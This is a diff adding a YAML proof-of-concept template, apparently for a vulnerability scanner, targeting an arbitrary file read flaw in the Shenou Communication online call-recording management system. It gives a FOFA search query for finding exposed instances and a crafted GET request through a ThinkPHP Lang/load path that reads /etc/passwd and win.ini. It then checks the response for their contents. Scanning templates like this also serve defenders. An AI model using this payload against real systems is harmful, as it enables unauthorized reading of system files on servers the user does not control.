@@ -1,0 +1,33 @@
+id: poc-yaml-shenou-communication-file-anyfile-read
+info:
+  name: 申瓯通信 在线录音管理系统 file 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 在线录音管理系统
+  fofa: title="在线录音管理系统"
+variables:
+  paths: 'C:/windows/win.ini
+
+    etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /callcenter/public/index.php?s=index/\think\Lang/load&file=/{{.paths}}
+  expression: 'status_code == 500
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"bit app support"))
+
+    )
+
+    '
+transport: http
